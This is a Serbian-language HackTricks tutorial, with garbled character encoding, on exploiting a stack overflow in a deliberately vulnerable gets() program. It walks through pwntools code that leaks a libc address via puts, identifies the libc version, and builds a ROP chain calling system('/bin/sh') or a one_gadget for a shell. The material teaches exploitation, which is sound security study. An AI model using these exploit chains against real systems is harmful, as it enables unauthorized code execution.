# Curjenje libc adrese sa ROP

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## Brzi rezime

1. **PronaÄ‘ite** offset **prelivanja**
2. **PronaÄ‘ite** `POP_RDI` gadget, `PUTS_PLT` i `MAIN`
3. Koristite prethodne gadgete da **curite adresu u memoriji** funkcije puts ili druge libc funkcije i **pronaÄ‘ite verziju libc** ([preuzmite je](https://libc.blukat.me))
4. Sa bibliotekom, **izraÄunajte ROP i iskoristite ga**

## Ostali tutorijali i binarni fajlovi za veÅ¾banje

Ovaj tutorijal Ä‡e iskoristiti kod/binarni fajl predloÅ¾en u ovom tutorijalu: [https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\
JoÅ¡ korisnih tutorijala: [https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/), [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

## Kod

Ime fajla: `vuln.c`
```c
#include <stdio.h>

int main() {
char buffer[32];
puts("Simple ROP.\n");
gets(buffer);

return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector -no-pie
```
## ROP - Leaking LIBC template

KoristiÄ‡u kod koji se nalazi ovde da napravim exploit.\
Preuzmite exploit i stavite ga u istu direktoriju kao ranjivi binarni fajl i dajte potrebne podatke skripti:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## 1- PronalaÅ¾enje offset-a

Å ablon zahteva offset pre nego Å¡to nastavi sa exploit-om. Ako je bilo koji offset obezbeÄ‘en, izvrÅ¡iÄ‡e potrebni kod da ga pronaÄ‘e (podrazumevano `OFFSET = ""`):
```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
gdb.attach(p.pid, "c") #Attach and continue
payload = cyclic(1000)
print(r.clean())
r.sendline(payload)
#x/wx $rsp -- Search for bytes that crashed the application
#cyclic_find(0x6161616b) # Find the offset of those bytes
return
```
**IzvrÅ¡ite** `python template.py` GDB konzola Ä‡e se otvoriti sa programom koji se ruÅ¡i. Unutar te **GDB konzole** izvrÅ¡ite `x/wx $rsp` da dobijete **bajtove** koji Ä‡e prepisati RIP. Na kraju dobijte **offset** koristeÄ‡i **python** konzolu:
```python
from pwn import *
cyclic_find(0x6161616b)
```
![](<../../../../../.gitbook/assets/image (140).png>)

Nakon pronalaÅ¾enja ofseta (u ovom sluÄaju 40) promenite OFFSET promenljivu unutar Å¡ablona koristeÄ‡i tu vrednost.\
`OFFSET = "A" * 40`

Drugi naÄin bi bio da se koristi: `pattern create 1000` -- _izvrÅ¡iti do ret_ -- `pattern seach $rsp` iz GEF-a.

## 2- PronalaÅ¾enje GadÅ¾eta

Sada treba da pronaÄ‘emo ROP gadÅ¾ete unutar binarnog fajla. Ovi ROP gadÅ¾eti Ä‡e biti korisni za pozivanje `puts` kako bismo pronaÅ¡li **libc** koja se koristi, a kasnije za **pokretanje konaÄnog eksploita**.
```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```
`PUTS_PLT` je potreban za pozivanje **funkcije puts**.\
`MAIN_PLT` je potreban za ponovo pozivanje **main funkcije** nakon jedne interakcije da bi se **iskoristila** prelivanja **ponovo** (beskonaÄne runde eksploatacije). **Koristi se na kraju svakog ROP-a da ponovo pozove program**.\
**POP\_RDI** je potreban da **proÄ‘e** **parametar** u pozvanu funkciju.

U ovom koraku ne morate izvrÅ¡avati niÅ¡ta jer Ä‡e sve biti pronaÄ‘eno od strane pwntools tokom izvrÅ¡enja.

## 3- PronalaÅ¾enje libc biblioteke

Sada je vreme da pronaÄ‘emo koja verzija **libc** biblioteke se koristi. Da bismo to uradili, iskoristiÄ‡emo **leak** **adresu** u memoriji **funkcije** `puts` i zatim Ä‡emo **pretraÅ¾iti** u kojoj **verziji biblioteke** se nalazi verzija puts na toj adresi.
```python
def get_addr(func_name):
FUNC_GOT = elf.got[func_name]
log.info(func_name + " GOT @ " + hex(FUNC_GOT))
# Create rop chain
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

#Send our rop-chain payload
#p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
print(p.clean()) # clean socket buffer (read all and print)
p.sendline(rop1)

#Parse leaked address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
#If not libc yet, stop here
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))

return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
p.interactive()
```
Da bi se to postiglo, najvaÅ¾nija linija izvrÅ¡enog koda je:
```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```
Ovo Ä‡e poslati neke bajtove dok **ne prepiÅ¡e** **RIP**: `OFFSET`.\
Zatim, postaviÄ‡e se **adresa** gadgeta `POP_RDI` tako da Ä‡e sledeÄ‡a adresa (`FUNC_GOT`) biti saÄuvana u registru **RDI**. To je zato Å¡to Å¾elimo da **pozovemo puts** **prosljeÄ‘ujuÄ‡i** mu **adresu** `PUTS_GOT` jer je adresa u memoriji funkcije puts saÄuvana u adresi na koju pokazuje `PUTS_GOT`.\
Nakon toga, biÄ‡e pozvan `PUTS_PLT` (sa `PUTS_GOT` unutar **RDI**) tako da Ä‡e puts **proÄitati sadrÅ¾aj** unutar `PUTS_GOT` (**adresa funkcije puts u memoriji**) i **odÅ¡tampati** ga.\
Na kraju, **glavna funkcija se ponovo poziva** kako bismo mogli ponovo iskoristiti prelivanje.

Na ovaj naÄin smo **prevarili funkciju puts** da **odÅ¡tampa** **adresu** u **memoriji** funkcije **puts** (koja se nalazi u **libc** biblioteci). Sada kada imamo tu adresu moÅ¾emo **potraÅ¾iti koja verzija libc se koristi**.

![](<../../../../../.gitbook/assets/image (141).png>)

Kao Å¡to **iskoriÅ¡Ä‡avamo** neki **lokalni** binarni fajl, **nije potrebno** da otkrijemo koja verzija **libc** se koristi (samo pronaÄ‘ite biblioteku u `/lib/x86_64-linux-gnu/libc.so.6`).\
Ali, u sluÄaju udaljenog eksploata, objasniÄ‡u ovde kako moÅ¾ete to pronaÄ‡i:

### 3.1- PretraÅ¾ivanje verzije libc (1)

MoÅ¾ete pretraÅ¾iti koja biblioteka se koristi na veb stranici: [https://libc.blukat.me/](https://libc.blukat.me)\
TakoÄ‘e Ä‡e vam omoguÄ‡iti da preuzmete otkrivenu verziju **libc**

![](<../../../../../.gitbook/assets/image (142).png>)

### 3.2- PretraÅ¾ivanje verzije libc (2)

TakoÄ‘e moÅ¾ete uraditi:

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

Ovo Ä‡e potrajati, budite strpljivi.\
Za ovo da bi radilo, potrebni su nam:

* Ime libc simbola: `puts`
* Otkazana libc adresa: `0x7ff629878690`

MoÅ¾emo otkriti koja **libc** se najverovatnije koristi.
```bash
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
Dobijamo 2 podudaranja (trebalo bi da probate drugo ako prvo ne radi). Preuzmite prvo:
```bash
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
-> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
-> Downloading package
-> Extracting package
-> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```
Kopirajte libc iz `libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so` u naÅ¡ radni direktorijum.

### 3.3- Druge funkcije za leak
```python
puts
printf
__libc_start_main
read
gets
```
## 4- PronalaÅ¾enje adrese libc biblioteke i eksploatacija

U ovom trenutku trebali bismo znati koja se libc biblioteka koristi. PoÅ¡to eksploatiÅ¡emo lokalni binarni fajl, koristiÄ‡u samo: `/lib/x86_64-linux-gnu/libc.so.6`

Dakle, na poÄetku `template.py` promenite **libc** promenljivu na: `libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #Postavite putanju do biblioteke kada je znate`

Davanjem **putanje** do **libc biblioteke**, ostatak **eksploata Ä‡e biti automatski izraÄunat**.

Unutar `get_addr` funkcije, **osnovna adresa libc** Ä‡e biti izraÄunata:
```python
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))
```
{% hint style="info" %}
Napomena da **konaÄna libc osnovna adresa mora zavrÅ¡avati sa 00**. Ako to nije vaÅ¡ sluÄaj, moÅ¾da ste iscurili pogreÅ¡nu biblioteku.
{% endhint %}

Zatim, adresa funkcije `system` i **adresa** do stringa _"/bin/sh"_ Ä‡e biti **izraÄunate** iz **osnovne adrese** **libc** i date **libc biblioteci.**
```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
Na kraju, eksploit za izvrÅ¡enje /bin/sh Ä‡e biti pripremljen i poslat:
```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```
Hajde da objasnimo ovaj konaÄni ROP.\
Poslednji ROP (`rop1`) je ponovo pozvao glavnu funkciju, tako da moÅ¾emo **ponovo iskoristiti** **overflow** (zato je `OFFSET` ovde ponovo). Zatim, Å¾elimo da pozovemo `POP_RDI` koji pokazuje na **adresu** _"/bin/sh"_ (`BINSH`) i pozovemo **system** funkciju (`SYSTEM`) jer Ä‡e adresa _"/bin/sh"_ biti prosleÄ‘ena kao parametar.\
Na kraju, **adresa funkcije exit** je **pozvana** tako da proces **izlazi lepo** i ne generiÅ¡e se nikakvo upozorenje.

**Na ovaj naÄin Ä‡e exploit izvrÅ¡iti \_/bin/sh**\_\*\* shell.\*\*

![](<../../../../../.gitbook/assets/image (143).png>)

## 4(2)- KoriÅ¡Ä‡enje ONE\_GADGET

TakoÄ‘e moÅ¾ete koristiti [**ONE\_GADGET** ](https://github.com/david942j/one\_gadget) da dobijete shell umesto koriÅ¡Ä‡enja **system** i **"/bin/sh". ONE\_GADGET** Ä‡e pronaÄ‡i unutar libc biblioteke neki naÄin da dobije shell koristeÄ‡i samo jednu **ROP adresu**.\
MeÄ‘utim, obiÄno postoje neka ograniÄenja, najÄeÅ¡Ä‡a i lako izbegnuta su kao `[rsp+0x30] == NULL` PoÅ¡to kontroliÅ¡ete vrednosti unutar **RSP**, samo treba da poÅ¡aljete joÅ¡ nekoliko NULL vrednosti kako bi se ograniÄenje izbeglo.

![](<../../../../../.gitbook/assets/image (615).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
## EXPLOIT FILE

MoÅ¾ete pronaÄ‡i Å¡ablon za iskoriÅ¡Ä‡avanje ove ranjivosti ovde:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## UobiÄajeni problemi

### MAIN\_PLT = elf.symbols\['main'] nije pronaÄ‘en

Ako simbol "main" ne postoji. Tada moÅ¾ete pronaÄ‡i gde je glavni kod:
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
Ğ¸ Ñ€ÑƒÑ‡Ğ½Ğ¾ Ğ¿Ğ¾ÑÑ‚Ğ°Ğ²Ğ¸Ñ‚Ğµ Ğ°Ğ´Ñ€ĞµÑÑƒ:
```python
MAIN_PLT = 0x401080
```
### Puts nije pronaÄ‘en

Ako binarni fajl ne koristi Puts, trebali biste proveriti da li koristi

### `sh: 1: %s%s%s%s%s%s%s%s: nije pronaÄ‘en`

Ako pronaÄ‘ete ovu **greÅ¡ku** nakon kreiranja **svega** eksploita: `sh: 1: %s%s%s%s%s%s%s%s: nije pronaÄ‘en`

PokuÅ¡ajte da **oduzmete 64 bajta od adrese "/bin/sh"**:
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
